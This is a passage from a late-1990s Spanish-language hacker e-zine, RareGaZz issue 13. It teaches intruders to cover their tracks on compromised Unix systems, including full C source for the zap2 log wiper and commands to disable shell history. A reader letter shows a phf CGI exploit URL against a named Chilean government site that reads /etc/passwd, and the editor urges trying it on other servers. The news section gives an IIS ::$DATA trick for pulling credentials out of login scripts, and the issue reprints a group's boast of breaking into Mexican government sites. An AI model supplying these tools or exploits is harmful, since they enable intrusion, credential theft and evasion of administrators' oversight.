makina; todo lo ke hagas en esa makina se kedara grabado en unos logs.
De momento estaras puteado, ya ke si el root revisa los logs vera tu IP y
todo lo ke has hecho, kon lo ke te habran pillado y si el root de ese sistema
es un mala sombra, no kiero ni pensar lo ke te puede llegar a pasar...

Supongo ke no kerras ke te pase eso no¿? :)
Por eso el borrado de huellas es una de las tareas mas importantes kuando
se entra en una makina.
El problema de borrar las huellas es ke para poder borrar todas las
huellas has de ser root.

Los sistemas operativos llevan por defekto bastantes logs...
Los logs mas importantes son:
	_  UTMP - Indika kien esta konectado en kada momento.
        _  WTMP - Indika todas las entradas y salidas de la makina viktima
                  indikando el tty y el host.
	_  LASTLOG - Guarda un log indikando el momento exakto en el ke se
                     konekto el usuario por ultima vez.
	_  ACCT - Guarda todos los komandos ejekutados por los usuarios
                  (aunke sin argumentos) y komo os podreis imaginar eso
                  se hace un log enorme en un rato por lo ke no suele estar
                  aktivo, pero siempre hay ke tener en kuenta que puede
                  estar aktivo y que es una putada porke logea todo lo
                  que haces. En general, la mayoria de los zappers tienen
                  opciones para borrar el acct asi ke no hay problemas.
Estan ubicados en los siguientes directorios:
	_  UTMP : /etc o /var/adm o /usr/adm o /usr/var/adm o /var/log
	_  WTMP : /etc o /var/adm o /usr/adm o /usr/var/adm o /var/log
	_  LASTLOG :  /usr/var/adm o /usr/adm o /var/adm o /var/log
	_  ACCT :   /var/adm/acct (en algunos sistemas se puede llamar pacct)

Para borrar estas huellas, se puede usar el zap2, es muy usado aunke
si lo usas has de saber ke puede ser detektado facilmente kon distintos
programas ya ke no borra tus huellas sino ke las sustituye por ceros y ademas
no borra el acct.

Aki va el zap2 kuyo uso es: zap2 nombredeusuario :

		--------------==Corta aqui==--------------

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
 
int f;
 
void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;
 
    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
 
     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Now...that was as bad as shit!\n");
}

		--------------==EnD oF CuT==--------------

Seas o no seas root, has de tener kuidado kon el history. El history es un
archivo ke guarda todos los komandos que ejekutas y ke por ejemplo en la 
bash se llama .bash_history.
Para evitar ke se haga el history tienes varias alternativas:
	_  unset history
	_  poner un set y hacer algo del tipo HISTFILE=/dev/null
        _  ln -s /dev/null /.bash_history (suponiendo ke estamos en bash shell)


3.  Depedida;
Kon este articulo, akabo mi primera donacion al gran mundo del hacking
donde nadie es nadie y la BSA es una puta mierda. XD

Espero ke este dokumento te haya servido de algo, espero ke hayas aprendido
algo nuevo de tanta palabra ke he puesto aki, XD.

Por lo menos, seguramente ahora tendras un poko mas klaro el koncepto de lo
ke es el Hacking. (Te rekuerdo ke un Hacker no es igual ke un Cracker)

Algunas ideas de este dokumento han sido kopiadas de otros grandes
dokumendos ke me han ayudado muchisimo a entender lo ke y komo es el gran
arte del Hacking Basicko.

Esos grandes dokumentos son entre otros:
	_  "LA SUPER GUIA DEL HACKER by Nobody"
	_  "INTRODUCCION AL HACKING v2.0 por Daemon"
	_  "Un articulo sobre Rekursos Kompartidos por Pipero"
Kiero agradecer la ayuda de todos los autores ke han eskrito dokumentos
komo los ke me he basado yo...

Rekuerda mi E-mail --> kikeb@arrakis.es
A ver si alguien me envía un E-mail kritikando este artikulo, poniendome
buenos y nuevos Xploits, o dandome shells de sistemas... XD

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

                          COMUNICADO DE X-PLOIT

 Este es un comunicado de X-Ploit. el cual fue enviado a -=RareGaZz=- y a
otros medios de Comunicacion nacionales e Internacionales.

We hacked with EZLN (MEX) on 4th february.

4.Febrero.98 Secretaria de Hacienda y Credito Publico 
23.Abril.98 Comision Nacional del Agua 
29.Abril.98 Instituto Nacional de Estadistica Geografia e Informatica 
25.Mayo.98 Senado de la Republica 
14.Julio.98 Secretaria de Salud 

http://www.ssa.gob.mx

Durante un largo tiempo tuvimos un sniffer en la pagina del SENADO 
MEXICANO, esto es lo que obtuvimos, e-mails de los senadores.

Estaremos en cada sistema de cada secretaria, en cada biper, en cada 
celular de un funcionario, en cada cuenta bancaria y transaccion
electronica y en cada correo electronico del gobierno de este pais,
para publicar lo que realmente acontece en MEXICO a nuestras espaldas.
Los sistemas en los cuales tomamos el control fueron solo para demostrar
que donde haya un sistema ahi estaremos, tenemos la TECNOLOGIA, tenemos
el CONOCIMIENTO, TENEMOS EL PODER.

[X-PLOIT TEAM]
100% MEXICANO, Y EL PRIMERO

­­ Mexico para los mexicanos e Internet para X-Ploit !!
Esta es nuestra historia publica };) SHCP CNA INEGI SENADO SSA

Atte. [X-Ploit TEAM]

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

                       */*\/*\/*\/*\/*\/*\/*\*
                      /                       \
                    *|*   CARTAS DEL LECTOR   *|*
                    *|*   -----------------   *|*
                      \                       /
                       *\*/\*/\*/\*/\*/\*/\*/*

_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Bueno, les escribo para ver si pueden aclararme algunas dudas, digo,
si no es mucha molestia, ahi les va:

   1.- Para obtener una cuenta shell necesito que mi PC funcione como
       un terminal de un proveedor Unix, y si por casualidad mi proveedor
       trabaja bajo NT, aqu¡ va la pregunta ¨estoy jodido?

   2.- Supongamos que instalo linux en mi PC, que pasa con Gindous,
       no me crea conflictos, no puedo borrar Gindous porque necesito usar
       Visual Fox Pro, office, etc..., ¨que hago?

   3.- les ten¡a otras preguntas pero ya se me olvidaron, despu‚s les
       escribo y espero que me puedan ayudar, se despide su amigo.


  [ Para obtener una cuenta shell debes tener un proveedor que te de
    una shell de Unix o usar Linux (muy recomendado). La shell del
    proveedor la necesitarias solo si tu no tienes Unix ya que tienes
    necesidad de usar ese sistema operativo. Es tonteria que un
    proveedor que trabaja con NT te de un shell puesto que seria
    de MS-DOS y ... supongo que ya tienes MS-DOS en casa  :)

    En cuanto a tu segunda pregunta, si instalas linux en segundo
    lugar, una vez instalado Windows (en otra particion, claro), este
    te da la posibilidad de poner un menu de arranque (LILO) en el
    que puedes seleccionar la particion con la que quieres arrancar
    cada vez, bien Windows o Linux ]

_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Soy un muchacho de PERU, interesado en los temas H/C/P/V.
  Quiero fecilitarlos por la magnifica revista (zine), que tienen a su
  cargo, esto demuestra de lo que se puede llegar a lograr cuando un grupo
  que se interesa en lo mismo se une y todos colaboran, para lograr un
  objetivo, en este caso sacar a la luz RareGaZz.

  Tengo una pregunta:
  Para los que empezamos en esto, siempre nos dicen que debemos tener 
  instalado alguna variante de Unix en la maquina, bueno ademas, nos
  dicen que es una verdadera haza¤a lograr su instalacion. Hay alguna
  manera de facilitar su instalacion o de reducir los riesgos?, estoy
  pensando seriamente en instalar Linux en mi maquina, ademas por mi
  carrera en la Universidad, debo de mantener instalado el bendito
  'Guindous'.


  [ Cuando aparecio Linux era muuuuy dificil instalarlo, por no hablar
    de como configurarlo, pero hoy en dia viene todo preparado para
    tontos, es decir, para cualquier usuario que no tenga casi
    conocimientos de informatica. Incluso han sacado una beta (no se
    si ya hay version definitiva) de una version de Linux completamente
    en castellano).

    De todos modos, vuelvo a dar alguna direccion donde conseguir todo
    tipo de docs y ayuda en castellano. Ademas, si teneis algun problema,
    esos chicos, maniacos de Linux, os lo solucionaran. He aqui las
    direcciones:

		http://www.infor.es/LuCAS/
		http://www.insflug.nova.es/
    animo!!! ]

_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

  heyyy parece que lo del phf no funciona en www.congreso.cl...o
  quizas es que no se bien como es...alguien me lo puede repetir...???
  de todas formas, lo estoy haciendo de la siguiente manera:
  http://www.congreso.cl/cgi-bin/phf?Qalias=%0a/bin/cat%20/etc/passwd
  Notese que el %20 debe ser un espacio...

  si es asi..???


 [ Si, efectivamente lo que has escrito esta bien, pero es normal que
   no te funcione puesto que estara parcheado ... hoy en dia no quedan
   muchos servers con ese bug ... pero sigue intentando con otros
   porque aun quedan  muchos admins que no se enteran del rollo ... ]

_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Mando muchos, saludos a ustedes amigos de RareGazz, revista por
  preferencia, deacuerdo a mi.

  Ustedes me han hecho abrir mis grandes ojos envueltos en el mundo de
  los Lamer, ya que antes lo que hacia  yo, era buscar un password u otra
  cosa,  que me hiciera tener todo por facilidad, pero, siempre a un pero
  bueno o malo, en este caso bueno, por medio de la revista he aprendido
  muchas cosas, he buscado, estudiado, aprendi a programar en C, aunque
  muy vago, pero en fin gracias a ustedes tengo todo esto conocimientos,
  pero claro sin descartar a las otras revistas que han contribuido a
  construir otro hacker,

  ¨- ) Mi pregunta es la siguiente: Como puedo enviar un archivo, por
       medio de servicio gratuito de correo electronico, en este caso por
       medio de hotmail, y sino hay posibilidad, por donde puedo hacer
       esto en inet.

  [ De nuevo, gracias por los cumplidos ... nos agrada que encontreis
    interesante nuestro trabajo en el zine y demas secciones de la
    web. En cuanto a tu primera pregunta busca algun boton que ponga
    attach aunque no se si lo hay porque yo no uso hotmail. Y aprovecho
    para deciros a todos que intenteis buscar server de correo gratuito
    que ofrezcan buzon de correo, osea, acceso al POP3. Yo conozco un
    par, si alguien conoce mas que los mande. Aqui van: axis.org,
    altern.org ]

_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Soy nuevo en esto, y quisiera preguntar por que prefieren Linux o
  Unix?

  [ Veo que no los conoces ... sino no harias esa pregunta  :)   ]

_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                            =-_-=-_-=-_-=-_-=
                           |                 |
                           |     NOTICIAS    |
                           |     --------    |
                           |  _   _   _   _  |
                            =- -=- -=- -=- -=
_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 PlaXiuS nos envio el otro dia este magnifico bug para NT. Esperamos
que lo proveis y que nos digais si habeis conseguido hacer algo interesante
con el.

 Yo lo he probado en mas de 20 servers (muchos de ellos de reconicimiento de
 login / pass) y no pude sacar password, aunque si codigo muy interesante ...

 Este es el texto de PlaXiuS:

    << El sitio de Microsoft fue hackeado con un nuevo Bug ... que es
       el siguiente ..NOrmalmente en NT WEb Server o sea los que
       funcionana con el IIS de microsoft , tienen un pequeqisimo error para
       variar se pueden sacar los codigos fuentes de los Vscript de algunos
       formularios .. normalmente los formularios en Vscript ... son
       aquellos que usan los server para autentificar pedir password etc...
       jejeje al usar el siguiente bug podemos descubrir dichos codigos
       Fuentes, los cuales nos dan nombres de servidores,,servicios y hasta
       claves de acceso ,.,. como lo veen eh ....y el modus Operandus es el
       siguiente !!!!

       http://www.victima.com/login.asp

      este es un ejemplo del documento asp que normalmente se ocupa para
      identificar ---

      http://www.victima.com/login.asp::$DATA

       De esta forma vemos en el navegador , el codigo fuente del
       script .. como la veen he Y FUNCIONA ::::!!!

       El resto se los dejo a su imaginacion .....  >>

_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   En el anterior numero (el 12) propuse un nuevo proyecto, que se
   trataba de traducir los numeros de la famosa revista Phreak. Parece
   que ha sido un exito. De momento tenemos 2 o 3 numeros traducidos
   y hay un par mas que estaran dentro de poco. Necesitamos mas gente
   que quiera ayudar con las traducciones. Os recuerdo que son textos
   interesantisimos!!
_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Quiero recordaros a todos cuales son las normas para pertenecer a
   las listas y demas colaboraciones de RareGaZz.

   Parece que la gente anda algo despistada.
   La RareDudeZz es una lista de correo en la que cada uno puede
   realizar las preguntas que tenga o comentar cualquier cosa referente
   a temas de hack.

   Para no saturar nuestro correo estos comentarios deben ser lo mas
   breves posible y en formato ASCII, no en HTML. Ademas, debeis intentar
   evitar esas firmas tan largas porque sino se hace interminable el
   recibir el correo.

   Si alguien desea suscribirse debe enviar un mail a:
                        raregazz@iname.com

   con el subject: suscribe direccion@de.correo y para desuscribirse:
   unsuscribe direccion@de.correo

   AVISO : Ignoraremos todos aquellos mails que no cumplan los
           requisitos anteriores. Osea que si escribis a
           raredudez@coollist.com diciendo unsuscribe o borrarme
           o cualquier cosa, haremos caso omiso.

   Debeis escribir a raregazz@iname.com ... Tambien haremos caso
   omiso a los que no traigan el mail al lado del subject.

   Para formar parte de la base de datos de contactos (para mas
   informacion leer el numero 12) debeis escribir a la misma
   direccion (y no a la RareDudeZz) poniendo vuestro mail de contacto,
   Ciudad, Pais y con quien quereis contactar.
_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Hace poco realizamos la primera quedada en el IRC de los RareDudeZz
   y no estuvo nada mal. Pronto haremos mas quedadas para que podais todos
   aclarar vuestras dudas sobre cualquier tema. Los que aun no esten
   suscritos a la RareDudeZz que lo hagan ya porque sino no podran
   participar en las quedadas Ahh .. otra cosa. No debeis preocuparos
   de darnos vuestro mail ya que, como le dije el otro dia a un lector
   nuestro, NUNCA hackeamos a nuestros lectores!!!   :)
_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Hemos vuelto a actualizar la seccion de hacks. De momento solo
   tenemos dos pero creo que son muy interesantes. Si teneis algun hack
   bueno para mandarnos lo podeis hacer usando nuestra llave PGP.
_______________________________________________________________________________
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   Algun admin entre nuestros lectores??? Necesitamos urgentemente un
   mirror (o mas) para nuestra pagina ... ocupa algo mas de 10 Mb ...

Ä[ L l a v e s  P G P ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

<<::RareGaZz::>> // raregazz@iname.com

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>

mQGiBDV6jbIRBADl1IELaiXIUyKxED1if1YcTV6+d/flNE97cXC+nhFbfPKQ3oaj
ybIALWB3X9LhfbSc3uD5RTrHQcUATtYXRboMCUZe+OcI7dlndCsEyR1Jx9J49Qys
JbbjrPft9eWlA8SqEtSGaV8003phw09cWxhDu0LV/ijSngPpngjo+xsNJQCg/2qo
Ukocb3rX9hNNIjVb2a8SsjcD/2L6hM75g4KGY4qk2FlDWuoHivphn+ARO0fQCkmT
28UMf3dqktGXO5mn63mky/wjrTIjZd2w0jbeXIsyGFeD+1Bk3OGjJmds7j3pH8mP
jCvmoozX4MbHo5SbXi7MF4i/PNkcudlrXXZH/HAa6hBGqo7RHChFnZhxjfpvzX4Z
4BGCA/0ZTQyjqglnSPTyMPooMsi3QZZYZUIeKAcfYB1vuaf31X3CvKYlDLYF0qj4
5n15nIhyDHh3GwwlJJrdmOwmH/Fzn90mGn9xWpxD3Ou+qmvFLpn4RvupkupZkVJg
GJAfgDn+YnaVTeKqa+HME5RMzeKvIDHJVeXPf/JPe/RQg2kc6bQdUmFyZUdhWnog
PHJhcmVnYXp6QGluYW1lLmNvbT6JAEsEEBECAAsFAjV6jbIECwMBAgAKCRDzs12Y
6YPcYhezAKDpOa+ZYL9OzHv4DsryHl+yhwyXTwCeMQoUP8IDKHYycKV3aw9YCodC
Kze5BA0ENXqNsxAQAPkYoH5aBmF6Q5CV3AVsh4bsYezNRR8O2OCjecbJ3HoLrOQ/
40aUtjBKU9d8AhZIgLUV5SmZqZ8HdNP/46HFliBOmGW42A3uEF2rthccUdhQyiJX
Qym+lehWKzh4XAvb+ExN1eOqRsz7zhfoKp0UYeOEqU/Rg4Soebbvj6dDRgjGzB13
VyQ4SuLE8OiOE2eXTpITYfbb6yUOF/32mPfIfHmwch04dfv2wXPEgxEmK0Ngw+Po
1gr9oSgmC66prrNlD6IAUwGgfNaroxIe+g8qzh90hE/K8xfzpEDp19J3tkItAjbB
JstoXp18mAkKjX4t7eRdefXUkk+bGI78KqdLfDL2Qle3CH8IF3KiutapQvMF6PlT
ETlPtvFuuUs4INoBp1ajFOmPQFXz0AfGy0OplK33TGSGSfgMg71l6RfUodNQ+PVZ
X9x2Uk89PY3bzpnhV5JZzf24rnRPxfx2vIPFRzBhznzJZv8V+bv9kV7HAarTW56N
oKVyOtQa8L9GAFgr5fSI/VhOSdvNILSd5JEHNmszbDgNRR0PfIizHHxbLY7288kj
wEPwpVsYjY67VYy4XTjTNP18F1dDox0YbN4zISy1Kv884bEpQBgRjXyEpwpy1obE
AxnIByl6ypUM2Zafq9AKUJsCRtMIPWakXUGfnHy9iUsiGSa6q6Jew1XrPdYXAAIC
EACSSTN7roDGRmGohAOsqJpI60PKdgjCKGWrVYynv10Olg7V5Pycq3GV1+ZJydhn
UKs/x8MxghHj/VwZ5FftDYiK/za0Tnq1E63HEj43BLbvrGwnsov7wNiknzvjnEHp
UCc84uYhFqKaPfWafDLWKI4GsTI0x7RgQ0Vpn6Kxu/necFnT/AmEUvFQPkkBl8xI
5znTLn9wwb2FlOq2HBRW4F+bQaQaKpL5fWGFWw1ZPmven2RvA5XyeDuUBsbj/OkL
RQu9VlXb3mmD/rl0rzHK5tqPOmCp3IFTp/JY9TNbA1wEMC+WHsk1P2sE3fOYwP/0
w8xz2WpN83N12XB/rgrMaKUOrqn8sq7khYIasZITKZ23QAUAHu3mspVBjYvTKFqF
ih2xtEZi7rFeROxSM3gSobWbbL7eXYT1fXZkKYP5w3POD50vw2an9qItdCXjv9wz
7xD6ent7YpOiloPnal+3GMEHSsAPEwsfzz1l3Eirs6v5hMJQwiWJWRYwQe2rO/4Z
gCNl+2FFUTonOOIIetMxENwSNpBH4PGboLZj/sj3IyNJGa0C7fu+1qHVFF0pxSIR
KavkOPFl8BW4TnJCUCMa13QfxATvOqOiC9Y4ZVaUr9wD2+Czgd+xByFI7gwFQWgD
ZYr57ytKKcsFc8wp9ru+K2iv0CMkQs7QyvxbRN4qjZz4NIkAPwMFGDV6jbPzs12Y
6YPcYhECP48AoOk2UN0H/aa/dMjCjPZMPLs0Dt38AJ9ryQhkTcLGOLQOWZiGR2Fp
4XwaDg==
=crAP
-----END PGP PUBLIC KEY BLOCK-----

Azumlord // azumlord@bigfoot.com

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>

mQENAzPjTJ8AAAEIAPK1KI9F97qe09G16Rstzd1tlELbGmgRy8UPyzUkvMOTXIS9
onTp5gM3VEg8vJjCT9QrHsz6g0qRzttCO/+ixiHakVK3pzRO8EudwCVVEDECwAmM
aTDdspOZEn/mwoIO/UsAHAxQAuXNXL4JqscJ/ZNAlySchJgVk5KngyqMXlqpmwNW
CO7Gh4Ese2saJ++xvXWQHb+iBLHd/xo3cvNeJg5dFT2W/AjXa4WS/pXFmr5v8tut
yQIxJ4gw1XnEkoKlPIRQXLmHqs0Ct9069FbomKcfxb7mKbIIcAOhBKzhRtCQGiwJ
1yZOz61feAmCZTGT+wIcq0UGSeaQRzAu7Fxr5k0ABRG0IEF6dW0gTG9yZCA8QXp1
bUxvcmRAaG90bWFpbC5jb20+iQEVAwUQM+NMoEcwLuxca+ZNAQHi8ggAoRY+l28w
xlFbSB+Fb32pvBrHjuTSTtsfJqtKMbwx9Ot++3TWW9G+WgeHtdlSnMXMlfe5+Ft2
MxQwXfqMR4OzgyBVnkoaPH0Z2PBz6Cij44sLCrEQ+nZnpPAMTe60NCRphKwbXMGK
h8TNlIxxxPxtZSzO40dO4Rw5EkJcUQyykHmyHtzz/Ld7YfGYQmMEn40r2oX1k0/4
c8iJ1zrnzG6aiLKsvbm33SUx4wr9Q/0eBXALpijgzEs9PSau/ByCWEOwPJVpK2tQ
MaBF4rfm53UJxOCUBU8zYbG1rNUTY6UpYvvffnyaPzPoIZd2reYxY5i44WJCEXMF
+aRDrCB+VURqtg==
=r674
-----END PGP PUBLIC KEY BLOCK-----

Cytorax // cytorax@bigfoot.com

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>

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
CaunshY3mGriyqo=
=ngYB
-----END PGP PUBLIC KEY BLOCK-----


Guybrush // guybrush@cyberdude.com




Ä[ D e s p e d i d a ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  Bueno, eso fue todo por este numero 13 de su e-zine -=RareGaZz=- esperamos
  que les haya gustado, nos vemos en el numero 14.

  Ah casi lo olvido, volviendo al tema de lo Oficial............

  Este es el Disclaimer Oficial de la e-zine............

  01010101010101010101010101010101010101010101010101010101010101010101010
  10                                                                   01
  01 #!/bin/RareGaZzsh                                                 10
  10 # La informacion contenida en este zine tiene fines completamente 01
  01 # de entretenimiento y educativos, los autores de  la informacion 10
  10 # aqui presentada no se hacen responsables de los  posibles da¤os 01
  01 # que se puedan ocasionar......                                   10
  10                                                                   01 
  01010101010101010101010101010101010101010101010101010101010101010101010

  Hey que el Disclaimer no es al principio???
  Oh diablos!!!!!!

  -[EOT]-
  -[EOF]-

